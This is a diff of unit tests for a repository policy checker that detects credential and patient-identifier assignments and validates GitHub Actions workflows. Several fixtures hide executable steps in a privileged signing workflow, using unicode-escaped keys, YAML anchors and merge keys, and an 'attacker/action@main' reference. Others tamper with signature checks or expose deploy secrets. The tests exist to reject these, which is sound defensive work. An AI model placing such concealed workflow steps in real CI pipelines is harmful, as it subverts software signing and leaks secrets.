+                self.assertIsNone(MODULE.sensitive_content_label(json.dumps(payload)))
+
+    def test_markdown_external_values_and_colon_delimited_keys_have_parity(self) -> None:
+        payloads = (
+            ("- **db:pass" + "word:** exact-value", "credential assignment"),
+            ("1. `namespace:patient:" + "id:` P-123", "synthetic PHI marker"),
+            ("> __client " + "secret:__ exact-value", "credential assignment"),
+            ('{"db:pass' + 'word":"exact-value"}', "credential assignment"),
+            ("namespace:patient:" + "id: P-123", "synthetic PHI marker"),
+        )
+        for payload, label in payloads:
+            with self.subTest(payload=payload):
+                self.assert_sensitive_payload_parity(payload, label)
+
+    def test_markdown_and_colon_delimited_key_controls_remain_safe(self) -> None:
+        payloads = (
+            "Use **Patient ID:** as the documented field label.",
+            "- **db:pass" + "word:** ${DB_PASSWORD}",
+            "2) `namespace:patient:" + "id:` string",
+            "service:endpoint: https://example.invalid/path",
+            "namespace:safe:key: exact-value",
+            '{"namespace:patient:' + 'id":"string"}',
+        )
+        for payload in payloads:
+            with self.subTest(payload=payload):
+                self.assertIsNone(MODULE.sensitive_content_label(payload))
+
+    def test_empty_sensitive_placeholders_without_structural_children_are_safe(self) -> None:
+        payloads = (
+            "pass" + "word:\n",
+            "client" + "Secret:\n  # intentionally empty\n",
+            "patient_" + "id:\nnext: value\n",
+            '{"pass\\u0077ord": null, "patient' + 'Id": "string"}',
+        )
+        for payload in payloads:
+            with self.subTest(payload=payload):
+                self.assertIsNone(MODULE.sensitive_content_label(payload))
+
+    def test_yaml_scalar_continuations_have_parity_and_cover_all_sensitive_classes(self) -> None:
+        exact_payloads = (
+            ("pass" + "word: # supplied below\n\n  exact-value", "credential assignment"),
+            ("client" + "Secret:\n  # supplied below\n\n  \"quoted-value\"", "credential assignment"),
+            ("patient_" + "id: # supplied below\n\n  'P-123'", "synthetic PHI marker"),
+        )
+        for payload, label in exact_payloads:
+            with self.subTest(payload=payload):
+                self.assert_sensitive_payload_parity(payload, label)
+
+        sensitive_keys = (
+            ("password", "credential assignment"),
+            ("clientSecret", "credential assignment"),
+            ("apiKey", "credential assignment"),
+            ("accessToken", "credential assignment"),
+            ("patientId", "synthetic PHI marker"),
+            ("patientIdentifier", "synthetic PHI marker"),
+            ("clinicianId", "synthetic PHI marker"),
+            ("clinicianIdentifier", "synthetic PHI marker"),
+            ("facilityId", "synthetic PHI marker"),
+            ("facilityIdentifier", "synthetic PHI marker"),
+            ("tenantId", "synthetic PHI marker"),
+            ("tenantIdentifier", "synthetic PHI marker"),
+            ("userId", "synthetic PHI marker"),
+            ("userIdentifier", "synthetic PHI marker"),
+            ("mrn", "synthetic PHI marker"),
+        )
+        for key, label in sensitive_keys:
+            payload = f"{key}: # continuation\n\n  'exact-value'"
+            with self.subTest(key=key):
+                self.assertEqual(label, MODULE.sensitive_content_label(payload))
+
+        controls = (
+            "pass" + "word: # intentionally empty\n\n",
+            "client" + "Secret:\n  # runtime value only\n",
+            "api" + "Key: # placeholder below\n\n  <redacted>",
+            "patient" + "Id:\n  \"${PATIENT_ID}\"",
+        )
+        for payload in controls:
+            with self.subTest(payload=payload):
+                self.assertIsNone(MODULE.sensitive_content_label(payload))
+
+    def test_spaced_and_quoted_yaml_continuations_share_sensitive_key_parity(self) -> None:
+        parity_payloads = (
+            ("API key: # supplied below\n  exact-value", "credential assignment"),
+            ("'client secret':\n  \"quoted-value\"", "credential assignment"),
+            ('"Patient ID":\n  P-123', "synthetic PHI marker"),
+        )
+        for payload, label in parity_payloads:
+            with self.subTest(payload=payload):
+                self.assert_sensitive_payload_parity(payload, label)
+
+        sensitive_keys = (
+            ("password", "credential assignment"),
+            ("client secret", "credential assignment"),
+            ("API key", "credential assignment"),
+            ("access token", "credential assignment"),
+            ("Patient ID", "synthetic PHI marker"),
+            ("Patient identifier", "synthetic PHI marker"),
+            ("Clinician ID", "synthetic PHI marker"),
+            ("Clinician identifier", "synthetic PHI marker"),
+            ("Facility ID", "synthetic PHI marker"),
+            ("Facility identifier", "synthetic PHI marker"),
+            ("Tenant ID", "synthetic PHI marker"),
+            ("Tenant identifier", "synthetic PHI marker"),
+            ("User ID", "synthetic PHI marker"),
+            ("User identifier", "synthetic PHI marker"),
+            ("MRN", "synthetic PHI marker"),
+        )
+        key_renderers = (
+            lambda key: key,
+            lambda key: f"'{key}'",
+            lambda key: json.dumps(key),
+        )
+        for index, (key, label) in enumerate(sensitive_keys):
+            rendered_key = key_renderers[index % len(key_renderers)](key)
+            payload = f"{rendered_key}: # continuation\n\n  exact-value"
+            with self.subTest(key=key, rendered_key=rendered_key):
+                self.assertEqual(label, MODULE.sensitive_content_label(payload))
+
+        controls = (
+            "API key: # intentionally empty\n\n",
+            "'client secret':\n  # runtime value only\n",
+            '"Patient ID":\n  <redacted>',
+            "Facility identifier:\n  ${FACILITY_ID}",
+        )
+        for payload in controls:
+            with self.subTest(payload=payload):
+                self.assertIsNone(MODULE.sensitive_content_label(payload))
+
+    def test_prefixed_spaced_keys_have_same_line_and_continuation_parity(self) -> None:
+        sensitive_keys = (
+            ("database password", "credential assignment"),
+            ("service client secret", "credential assignment"),
+            ("DB API key", "credential assignment"),
+            ("OIDC access token", "credential assignment"),
+            ("source Patient ID", "synthetic PHI marker"),
+            ("source Patient identifier", "synthetic PHI marker"),
+            ("audit Clinician ID", "synthetic PHI marker"),
+            ("audit Clinician identifier", "synthetic PHI marker"),
+            ("home Facility ID", "synthetic PHI marker"),
+            ("home Facility identifier", "synthetic PHI marker"),
+            ("auth Tenant ID", "synthetic PHI marker"),
+            ("auth Tenant identifier", "synthetic PHI marker"),
+            ("actor User ID", "synthetic PHI marker"),
+            ("actor User identifier", "synthetic PHI marker"),
+            ("source MRN", "synthetic PHI marker"),
+        )
+        for key, label in sensitive_keys:
+            variants = (
+                f"{key}: exact-value",
+                f"{json.dumps(key)}: # continued\n  exact-value",
+            )
+            for payload in variants:
+                with self.subTest(key=key, payload=payload):
+                    self.assert_sensitive_payload_parity(payload, label)
+
+        complementary_variants = (
+            ('"DB API key": exact-value', "credential assignment"),
+            ("DB API key: # continued\n  exact-value", "credential assignment"),
+            ('"service client secret": exact-value', "credential assignment"),
+            ("service client secret: # continued\n  exact-value", "credential assignment"),
+            ('"source Patient ID": exact-value', "synthetic PHI marker"),
+            ("source Patient ID: # continued\n  exact-value", "synthetic PHI marker"),
+        )
+        for payload, label in complementary_variants:
+            with self.subTest(payload=payload):
+                self.assert_sensitive_payload_parity(payload, label)
+
+    def test_prefixed_spaced_key_near_matches_remain_safe_across_all_paths(self) -> None:
+        payload = "\n".join(
+            (
+                "DB API key note: documented non-sensitive field",
+                "service client secretary: documented non-sensitive field",
+                "source Patient identity: documented non-sensitive field",
+                "audit Clinician identifier note: documented non-sensitive field",
+                "home Facility ID policy: documented non-sensitive field",
+                "auth Tenant idea: documented non-sensitive field",
+                "actor User idempotency: documented non-sensitive field",
+                '"DB API key note": documented non-sensitive field',
+                '"source Patient identity": documented non-sensitive field',
+            )
+        )
+        self.assert_safe_payload_parity(payload)
+
+    def test_plain_numbered_assignments_have_parity_across_all_scan_paths(self) -> None:
+        payloads = (
+            ("1. database pass" + "word: exact-value", "credential assignment"),
+            ("1) service client " + "secret = exact-value", "credential assignment"),
+            ("12. DB API " + "key: exact-value", "credential assignment"),
+            ("12) OIDC access " + "token = exact-value", "credential assignment"),
+            ("1. source Patient " + "ID: P-123", "synthetic PHI marker"),
+            ("1) audit Clinician " + "identifier = C-123", "synthetic PHI marker"),
+        )
+        for payload, label in payloads:
+            with self.subTest(payload=payload):
+                self.assert_sensitive_payload_parity(payload, label)
+
+    def test_plain_numbered_continuations_have_parity_across_all_scan_paths(self) -> None:
+        payloads = (
+            ("1. database pass" + "word:\n   exact-value", "credential assignment"),
+            ("1) service client " + "secret:\n   exact-value", "credential assignment"),
+            ("12. DB API " + "key: # continued\n    exact-value", "credential assignment"),
+            ("12) source Patient " + "ID:\n    P-123", "synthetic PHI marker"),
+        )
+        for payload, label in payloads:
+            with self.subTest(payload=payload):
+                self.assert_sensitive_payload_parity(payload, label)
+
+    def test_numbered_assignment_controls_remain_safe_across_all_scan_paths(self) -> None:
+        payloads = (
+            "1. The database password policy requires runtime injection.",
+            "1) The source Patient ID field is synthetic documentation.",
+            "1. database pass" + "word: <redacted>",
+            "1) service client " + "secret: ${CLIENT_SECRET}",
+            "12. source Patient " + "ID:\n    ${PATIENT_ID}",
+            "12) DB API " + "key:\n    <redacted>",
+        )
+        for payload in payloads:
+            with self.subTest(payload=payload):
+                self.assert_safe_payload_parity(payload)
+
+    def test_plain_numbered_assignments_are_enforced_end_to_end(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            root = self.copy_repository(directory)
+            target = root / "docs" / "numbered-sensitive-assignment.md"
+            target.write_text(
+                "1. database pass" + "word: <redacted>\n",
+                encoding="utf-8",
+            )
+            MODULE.validate_self_check(root)
+
+            target.write_text(
+                "1) service client " + "secret:\n   exact-value\n",
+                encoding="utf-8",
+            )
+            with self.assertRaisesRegex(
+                MODULE.PolicyError,
+                r"possible credential assignment found in docs/numbered-sensitive-assignment\.md",
+            ):
+                MODULE.validate_self_check(root)
+
+    def test_markdown_label_continuations_have_parity_all_classes_and_safe_controls(self) -> None:
+        exact_payloads = (
+            ("**pass" + "word:**\nexact-value", "credential assignment"),
+            ("- __client " + "secret:__  \n  \"quoted-value\"", "credential assignment"),
+            ("> `Patient " + "ID:`\\\n> P-123", "synthetic PHI marker"),
+            ('**"API key":**\nexact-value', "credential assignment"),
+            ("- __'client secret':__\n  exact-value", "credential assignment"),
+            ('> `"Patient ID":`\n> P-123', "synthetic PHI marker"),
+            ("1. **facility " + "identifier:**\n   exact-value", "synthetic PHI marker"),
+            ("> - **tenant " + "identifier:**\n>   exact-value", "synthetic PHI marker"),
+        )
+        for payload, label in exact_payloads:
+            with self.subTest(payload=payload):
+                self.assert_sensitive_payload_parity(payload, label)
+
+        sensitive_keys = (
+            ("password", "credential assignment"),
+            ("client secret", "credential assignment"),
+            ("API key", "credential assignment"),
+            ("access token", "credential assignment"),
+            ("Patient ID", "synthetic PHI marker"),
+            ("Patient identifier", "synthetic PHI marker"),
+            ("Clinician ID", "synthetic PHI marker"),
+            ("Clinician identifier", "synthetic PHI marker"),
+            ("Facility ID", "synthetic PHI marker"),
+            ("Facility identifier", "synthetic PHI marker"),
+            ("Tenant ID", "synthetic PHI marker"),
+            ("Tenant identifier", "synthetic PHI marker"),
+            ("User ID", "synthetic PHI marker"),
+            ("User identifier", "synthetic PHI marker"),
+            ("MRN", "synthetic PHI marker"),
+        )
+        for key, label in sensitive_keys:
+            payload = f"- **{key}:**\n  exact-value"
+            with self.subTest(key=key):
+                self.assertEqual(label, MODULE.sensitive_content_label(payload))
+
+        controls = (
+            "**pass" + "word:**",
+            "- __client " + "secret:__\n",
+            "**API " + "key:**\n<redacted>",
+            "> `Patient " + "ID:`  \n> ${PATIENT_ID}",
+            "> `Tenant " + "ID:`\\\n> ${TENANT_ID}",
+            "1. **Facility " + "identifier:**\n   \"${FACILITY_ID}\"",
+        )
+        for payload in controls:
+            with self.subTest(payload=payload):
+                self.assertIsNone(MODULE.sensitive_content_label(payload))
+
+    def test_structural_sensitive_values_are_enforced_end_to_end(self) -> None:
+        payloads = (
+            '{"pass\\u0077ord": {"nested": ["value"]}}',
+            "client" + "Secret:\n  - item\n",
+            "patient_" + "id:\n  child: value\n",
+        )
+        for payload in payloads:
+            with self.subTest(payload=payload), tempfile.TemporaryDirectory() as directory:
+                root = self.copy_repository(directory)
+                target = root / "docs" / "structural-sensitive-value.md"
+                target.write_text(payload, encoding="utf-8")
+                with self.assertRaisesRegex(MODULE.PolicyError, "possible"):
+                    MODULE.validate_self_check(root)
+
+        with tempfile.TemporaryDirectory() as directory:
+            root = self.copy_repository(directory)
+            target = root / "docs" / "safe-empty-sensitive-values.md"
+            target.write_text(
+                "pass" + "word:\n  # intentionally empty\npatient_" + "id:\n",
+                encoding="utf-8",
+            )
+            MODULE.validate_self_check(root)
+
+    def test_assignment_extraction_match_bound_fails_closed(self) -> None:
+        payload = "\n".join(
+            f"safe_{index}=null"
+            for index in range(MODULE.MAX_ASSIGNMENT_MATCHES + 1)
+        )
+        with self.assertRaisesRegex(MODULE.PolicyError, "match bound"):
+            MODULE.sensitive_content_label(payload)
+
+    def test_json_and_content_scan_bounds_fail_closed(self) -> None:
+        with self.assertRaisesRegex(MODULE.PolicyError, "size bound"):
+            MODULE.sensitive_content_label(
+                "x" * (MODULE.MAX_SENSITIVE_SCAN_CHARS + 1)
+            )
+
+        malformed = '{"safe": true, DB_PASS' + "WORD=exposed"
+        self.assertEqual(
+            "credential assignment", MODULE.sensitive_content_label(malformed)
+        )
+
+        with mock.patch.object(MODULE, "MAX_JSON_DEPTH", 2):
+            with self.assertRaisesRegex(MODULE.PolicyError, "structural bounds"):
+                MODULE.sensitive_content_label('{"a":{"b":{"c":null}}}')
+        with mock.patch.object(MODULE, "MAX_JSON_NODES", 2):
+            with self.assertRaisesRegex(MODULE.PolicyError, "structural bounds"):
+                MODULE.sensitive_content_label('[null,null]')
+        with mock.patch.object(MODULE, "MAX_JSON_CANDIDATES", 2):
+            with self.assertRaisesRegex(MODULE.PolicyError, "candidate bound"):
+                MODULE.sensitive_content_label("prefix {} middle [] suffix {}")
+
+        deeply_nested = "[" * 2000 + "]" * 2000
+        with self.assertRaisesRegex(MODULE.PolicyError, "structural bounds"):
+            MODULE.sensitive_content_label(deeply_nested)
+
+    def test_sensitive_scanners_allow_declarations_placeholders_and_prose(self) -> None:
+        allowed = (
+            "A pass" + "word must never be stored in this repository.",
+            "Reject client_" + "secret fields and access token examples.",
+            "The patient_" + "id field is prohibited in synthetic documentation.",
+            "Use the neutral project identity for source commits.",
+            "pass" + "word: null",
+            "DB_PASS" + "WORD = NONE # intentionally unset",
+            '"MY_API_' + 'KEY": "string",',
+            "access" + "Token: str",
+            "patient_" + "id:",
+            "clinician" + "Id = None",
+            '"facility_' + 'identifier": "STRING",',
+            "tenant_" + "id: null # populated at runtime",
+            "user" + "Identifier = str",
+            "M" + "RN: none",
+            "DB_PASS" + "WORD: <redacted>",
+            "client" + "Secret=${CLIENT_SECRET}",
+            "Document access_" + "token handling without assigning a value.",
+            "Use a synthetic patient_" + "id in examples without assigning it.",
+            "The clientsecretary field is not a client secret assignment.",
+            "The apikeynote field documents policy rather than a key.",
+            "The patientidentity field is not a patient identifier assignment.",
+            "A client secret must never be stored in this repository.",
+            "The API key and Patient ID examples are placeholders, not assignments.",
+            "Use `client secret` and **Patient ID** only as field names.",
+            "`client secret: ${CLIENT_SECRET}`",
+            "**API key = <redacted>**",
+            "__Patient ID: string__",
+            '"facility identifier": null',
+        )
+        for payload in allowed:
+            with self.subTest(payload=payload), tempfile.TemporaryDirectory() as directory:
+                root = Path(directory)
+                target = root / "docs" / "ordinary.md"
+                target.parent.mkdir()
+                target.write_text(payload, encoding="utf-8")
+                MODULE.scan_sensitive_content(root, MODULE.repository_files(root))
+                MODULE.scan_sensitive_bytes("ordinary.md", payload.encode())
+
+    def test_literal_space_keys_and_markdown_assignments_have_scan_path_parity(self) -> None:
+        sensitive_keys = (
+            ("password", "credential assignment"),
+            ("client secret", "credential assignment"),
+            ("API key", "credential assignment"),
+            ("access token", "credential assignment"),
+            ("Patient ID", "synthetic PHI marker"),
+            ("Patient identifier", "synthetic PHI marker"),
+            ("Clinician ID", "synthetic PHI marker"),
+            ("Clinician identifier", "synthetic PHI marker"),
+            ("Facility ID", "synthetic PHI marker"),
+            ("Facility identifier", "synthetic PHI marker"),
+            ("Tenant ID", "synthetic PHI marker"),
+            ("Tenant identifier", "synthetic PHI marker"),
+            ("User ID", "synthetic PHI marker"),
+            ("User identifier", "synthetic PHI marker"),
+            ("MRN", "synthetic PHI marker"),
+        )
+        formats = (
+            lambda key: json.dumps({key: "SYNTHETIC-VALUE-123"}),
+            lambda key: f"{key}: SYNTHETIC-VALUE-123",
+            lambda key: f"`{key} = SYNTHETIC-VALUE-123`",
+            lambda key: f"Use **{key}: SYNTHETIC-VALUE-123** only in this example.",
+            lambda key: f"__{key} = SYNTHETIC-VALUE-123__",
+        )
+        fixture = self.load_fixture(SOURCE_ROOT)
+        valid_commit = base64.b64decode(
+            fixture["sourceCommit"]["rawBase64"], validate=True
+        )
+        headers, separator, _ = valid_commit.partition(b"\n\n")
+
+        for key, label in sensitive_keys:
+            for render in formats:
+                payload = render(key)
+                with self.subTest(key=key, payload=payload):
+                    self.assertEqual(label, MODULE.sensitive_content_label(payload))
+                    with tempfile.TemporaryDirectory() as directory:
+                        root = self.copy_repository(directory)
+                        target = root / "docs" / "literal-space-key.md"
+                        target.write_text(payload, encoding="utf-8")
+                        with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
+                            MODULE.validate_self_check(root)
+
+                        mutated = self.load_fixture(root)
+                        contents = MODULE.load_published_archive(mutated)
+                        contents["README.md"] = payload.encode()
+                        compressed, tar_bytes = MODULE.canonical_published_archive(contents)
+                        self.set_fixture_archive(mutated, compressed, len(tar_bytes))
+                        self.write_fixture(root, mutated)
+                        with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
+                            MODULE.load_published_fixture(root)
+
+                    commit = headers + separator + payload.encode() + b"\n"
+                    with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
+                        MODULE.validate_published_commit_headers(commit)
+
+    def test_sensitive_assignment_behavior_is_enforced_end_to_end(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            root = self.copy_repository(directory)
+            safe = root / "docs" / "safe-assignment-declarations.md"
+            safe.write_text(
+                "patient_" + "id: null\n" + "DB_PASS" + "WORD: string\n",
+                encoding="utf-8",
+            )
+            MODULE.validate_self_check(root)
+            safe.write_text(
+                "patient_" + "id: null\n" + '"MY_API_' + 'KEY": "x"\n',
+                encoding="utf-8",
+            )
+            with self.assertRaisesRegex(
+                MODULE.PolicyError,
+                r"possible credential assignment found in docs/safe-assignment-declarations\.md",
+            ):
+                MODULE.validate_self_check(root)
+
     def test_sensitive_filename_fails(self) -> None:
         with tempfile.TemporaryDirectory() as directory:
             root = self.copy_repository(directory)
@@ -787,7 +1895,7 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 "actions/checkout@v4",
             )
             with self.assertRaisesRegex(MODULE.PolicyError, "full lowercase"):
-                MODULE.validate_self_check(root)
+                MODULE.validate_workflow_semantics(root)
 
     def test_local_docker_unknown_and_extra_actions_fail(self) -> None:
         mutations = (
@@ -816,7 +1924,7 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 with self.assertRaisesRegex(
                     MODULE.PolicyError, "uses|action.*allowlist"
                 ):
-                    MODULE.validate_self_check(root)
+                    MODULE.validate_workflow_semantics(root)
 
     def test_broad_and_unexpected_job_permissions_fail(self) -> None:
         mutations = (
@@ -843,8 +1951,10 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
             with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
                 root = self.copy_repository(directory)
                 self.mutate_workflow(root, old, new)
-                with self.assertRaisesRegex(MODULE.PolicyError, "permissions"):
-                    MODULE.validate_self_check(root)
+                with self.assertRaisesRegex(
+                    MODULE.PolicyError, "permissions|flow collections"
+                ):
+                    MODULE.validate_workflow_semantics(root)
 
     def test_pr_validation_uses_only_trusted_base_code_against_inert_candidate(self) -> None:
         validation = (
@@ -855,6 +1965,49 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
         self.assertNotIn("candidate/scripts", validation)
         self.assertNotIn("secrets.", validation)
         self.assertEqual(4, validation.count("persist-credentials: false"))
+
+    def test_checkout_associations_reject_count_preserving_pairwise_swaps(self) -> None:
+        pr_trusted = "Checkout trusted base controls"
+        pr_candidate = "Checkout pull request head as inert candidate data"
+        main_trusted = "Checkout previous trusted main controls"
+        main_candidate = "Checkout main candidate data"
+        original = (
+            SOURCE_ROOT / ".github" / "workflows" / "validate-control.yml"
+        ).read_text(encoding="utf-8")
+        association_tokens = (
+            "repository: ${{ github.repository }}",
+            "repository: ${{ github.event.pull_request.head.repo.full_name }}",
+            "ref: ${{ github.event.pull_request.base.sha }}",
+            "ref: ${{ github.event.pull_request.head.sha }}",
+            "ref: ${{ github.event.before }}",
+            "ref: ${{ github.sha }}",
+            "path: trusted",
+            "path: candidate",
+        )
+        mutations = (
+            (pr_trusted, pr_candidate, "repository"),
+            (pr_trusted, pr_candidate, "ref"),
+            (pr_trusted, pr_candidate, "path"),
+            (main_trusted, main_candidate, "ref"),
+            (main_trusted, main_candidate, "path"),
+        )
+        for first, second, field in mutations:
+            with self.subTest(
+                first=first, second=second, field=field
+            ), tempfile.TemporaryDirectory() as directory:
+                root = self.copy_repository(directory)
+                self.swap_checkout_field(root, first, second, field)
+                validation = (
+                    root / ".github" / "workflows" / "validate-control.yml"
+                ).read_text(encoding="utf-8")
+                for token in association_tokens:
+                    self.assertEqual(original.count(token), validation.count(token))
+                self.assertEqual(4, validation.count("fetch-depth: 1"))
+                self.assertEqual(4, validation.count("persist-credentials: false"))
+                with self.assertRaisesRegex(
+                    MODULE.PolicyError, "exact trust associations"
+                ):
+                    MODULE.validate_control_validation_workflow(validation)
 
     def test_main_push_validation_uses_previous_trusted_verifier(self) -> None:
         validation = (
@@ -925,7 +2078,7 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 root = self.copy_repository(directory)
                 self.mutate_named_workflow(root, "validate-control.yml", old, new)
                 with self.assertRaises(MODULE.PolicyError):
-                    MODULE.validate_self_check(root)
+                    MODULE.validate_workflow_semantics(root)
 
     def test_authenticity_request_is_required_exact_and_canonical(self) -> None:
         variants = (
@@ -961,6 +2114,14 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 MODULE.validate_self_check(root)
         with tempfile.TemporaryDirectory() as directory:
             root = self.copy_repository(directory)
+            policy_path = root / "release-control-policy.json"
+            policy = json.loads(policy_path.read_text(encoding="utf-8"))
+            policy["authenticity"] = {
+                "signingConfigured": False,
+                "expectedCertificateIdentity": MODULE.verify_authenticity.IDENTITY_PLACEHOLDER,
+                "certificateOidcIssuer": MODULE.verify_authenticity.EXPECTED_ISSUER,
+            }
+            policy_path.write_text(json.dumps(policy), encoding="utf-8")
             (root / "authenticity" / "authenticity-request.sigstore.json").write_text(
                 '{"mediaType":"test"}', encoding="utf-8"
             )
@@ -983,7 +2144,7 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 root = self.copy_repository(directory)
                 self.mutate_signing_workflow(root, old, new)
                 with self.assertRaises(MODULE.PolicyError):
-                    MODULE.validate_self_check(root)
+                    MODULE.validate_workflow_semantics(root)
 
     def test_signing_workflow_requires_fail_closed_identity_guard(self) -> None:
         with tempfile.TemporaryDirectory() as directory:
@@ -994,7 +2155,125 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 "true",
             )
             with self.assertRaisesRegex(MODULE.PolicyError, "required control"):
-                MODULE.validate_self_check(root)
+                MODULE.validate_workflow_semantics(root)
+
+    def test_signing_workflow_shell_block_matches_finite_allowlist(self) -> None:
+        signing = (
+            SOURCE_ROOT / ".github" / "workflows" / "sign-authenticity-request.yml"
+        ).read_text(encoding="utf-8")
+        self.assertEqual(
+            MODULE.expected_signing_shell_blocks(),
+            MODULE.active_shell_blocks(signing),
+        )
+        self.assertEqual(
+            MODULE.expected_signing_executable_steps(),
+            MODULE.executable_step_inventory(
+                signing, "sign-authenticity-request.yml"
+            ),
+        )
+        MODULE.validate_workflows(SOURCE_ROOT)
+
+    def test_signing_workflow_rejects_inline_run_and_shell_inventory_drift(self) -> None:
+        mutations = (
+            (
+                "      - name: Upload request and genuine Sigstore bundle only",
+                "      - name: Unexpected inline command\n"
+                "        shell: bash\n"
+                "        run: true\n\n"
+                "      - name: Upload request and genuine Sigstore bundle only",
+            ),
+            (
+                "      - name: Upload request and genuine Sigstore bundle only",
+                "      - name: Unexpected block command\n"
+                "        shell: bash\n"
+                "        run: |\n"
+                "          true\n\n"
+                "      - name: Upload request and genuine Sigstore bundle only",
+            ),
+            ("        shell: bash", "        shell: sh"),
+            ("        shell: bash\n", ""),
+            ("        shell: bash", "        shell: bash\n        shell: bash"),
+            ("        shell: bash", "        shell: bash --noprofile --norc"),
+        )
+        for old, new in mutations:
+            with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
+                root = self.copy_repository(directory)
+                self.mutate_signing_workflow(root, old, new)
+                with self.assertRaisesRegex(MODULE.PolicyError, "executable|shell"):
+                    MODULE.validate_workflow_semantics(root)
+
+    def test_privileged_workflows_reject_yaml_constructs_that_hide_executable_keys(
+        self,
+    ) -> None:
+        insertion = "      - name: Upload request and genuine Sigstore bundle only"
+        mutations = {
+            "quoted run": "      - name: Quoted run\n        'run': true\n\n",
+            "unicode-escaped run": '      - name: Hidden run\n        "r\\u0075n": true\n\n',
+            "unicode-escaped uses": (
+                '      - name: Hidden uses\n        "u\\u0073es": attacker/action@main\n\n'
+            ),
+            "unicode-escaped shell": (
+                '      - name: Hidden shell\n        "sh\\u0065ll": bash\n\n'
+            ),
+            "tagged key": "      - name: Tagged key\n        !evil run: true\n\n",
+            "anchor": "      - &hidden\n        run: true\n\n",
+            "alias": "      - *hidden\n\n",
+            "merge key": "      - name: Merged executable\n        <<: *hidden\n\n",
+            "flow mapping": '      - { "r\\u0075n": true }\n\n',
+            "flow sequence": "      - [run, true]\n\n",
+        }
+        for label, hidden_step in mutations.items():
+            with self.subTest(label=label), tempfile.TemporaryDirectory() as directory:
+                root = self.copy_repository(directory)
+                self.mutate_signing_workflow(
+                    root,
+                    insertion,
+                    hidden_step + insertion,
+                )
+                with self.assertRaisesRegex(MODULE.PolicyError, "privileged workflow"):
+                    MODULE.validate_workflow_semantics(root)
+
+    def test_signing_workflow_rejects_nonfinite_and_inactive_commands(self) -> None:
+        mutations = (
+            (
+                '          cp -- "$request" "$RUNNER_TEMP/authenticity-request.json"',
+                '          cp -- "$request" "$RUNNER_TEMP/authenticity-request.json"\n'
+                "          true",
+            ),
+            (
+                '          cp -- "$request" "$RUNNER_TEMP/authenticity-request.json"',
+                '          cp -- "$request" "$RUNNER_TEMP/authenticity-request.json"; true',
+            ),
+            (
+                '          cosign sign-blob --yes --bundle "$bundle" "$request"',
+                '          cosign sign-blob --yes --bundle "$bundle" "$request" | tee bundle.log',
+            ),
+            (
+                '          cosign verify-blob \\',
+                '          # cosign verify-blob\n'
+                '          c\\osign verify-blob \\',
+            ),
+            (
+                '          test "$identity" = "https://github.com/$GITHUB_REPOSITORY/'
+                '.github/workflows/sign-authenticity-request.yml@refs/heads/main"',
+                '          # test "$identity" = "https://github.com/$GITHUB_REPOSITORY/'
+                '.github/workflows/sign-authenticity-request.yml@refs/heads/main"',
+            ),
+            (
+                '          cosign sign-blob --yes --bundle "$bundle" "$request"',
+                '          # cosign sign-blob --yes --bundle "$bundle" "$request"',
+            ),
+            (
+                '          cosign verify-blob \\',
+                '          # cosign verify-blob \\',
+            ),
+        )
+        for old, new in mutations:
+            with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
+                root = self.copy_repository(directory)
+                self.mutate_signing_workflow(root, old, new)
+                with self.assertRaisesRegex(MODULE.PolicyError, "finite command allowlist"):
+                    MODULE.validate_workflow_semantics(root)
 
     def test_unsafe_trigger_and_public_self_hosted_runner_fail(self) -> None:
         mutations = (
@@ -1006,7 +2285,7 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 root = self.copy_repository(directory)
                 self.mutate_workflow(root, old, new)
                 with self.assertRaisesRegex(MODULE.PolicyError, "unsafe"):
-                    MODULE.validate_self_check(root)
+                    MODULE.validate_workflow_semantics(root)
 
     def test_dynamic_environment_and_gate_secret_fail(self) -> None:
         with tempfile.TemporaryDirectory() as directory:
@@ -1015,7 +2294,7 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 root, "environment:\n      name: staging", "environment: ${{ inputs.environment }}"
             )
             with self.assertRaisesRegex(MODULE.PolicyError, "required control|static"):
-                MODULE.validate_self_check(root)
+                MODULE.validate_workflow_semantics(root)
         with tempfile.TemporaryDirectory() as directory:
             root = self.copy_repository(directory)
             self.mutate_workflow(
@@ -1024,7 +2303,7 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 "GH_TOKEN: ${{ secrets.DEPLOY_SSH_PRIVATE_KEY }}",
             )
             with self.assertRaisesRegex(MODULE.PolicyError, "gate"):
-                MODULE.validate_self_check(root)
+                MODULE.validate_workflow_semantics(root)
 
     def test_runtime_host_enrollment_and_unknown_secret_fail(self) -> None:
         with tempfile.TemporaryDirectory() as directory:
@@ -1035,7 +2314,7 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 "ssh-keyscan \"$DEPLOY_HOST\" > \"$known_hosts\"",
             )
             with self.assertRaisesRegex(MODULE.PolicyError, "unsafe"):
-                MODULE.validate_self_check(root)
+                MODULE.validate_workflow_semantics(root)
         with tempfile.TemporaryDirectory() as directory:
             root = self.copy_repository(directory)
             self.mutate_workflow(
@@ -1044,7 +2323,7 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 "DEPLOY_HOST: ${{ secrets.UNSCOPED_TOKEN }}",
             )
             with self.assertRaisesRegex(MODULE.PolicyError, "allowlist"):
-                MODULE.validate_self_check(root)
+                MODULE.validate_workflow_semantics(root)
 
     def test_missing_static_environment_and_token_permission_fail(self) -> None:
         with tempfile.TemporaryDirectory() as directory:
@@ -1053,12 +2332,12 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 root, "environment:\n      name: prod", "environment:\n      name: production"
             )
             with self.assertRaisesRegex(MODULE.PolicyError, "required control"):
-                MODULE.validate_self_check(root)
+                MODULE.validate_workflow_semantics(root)
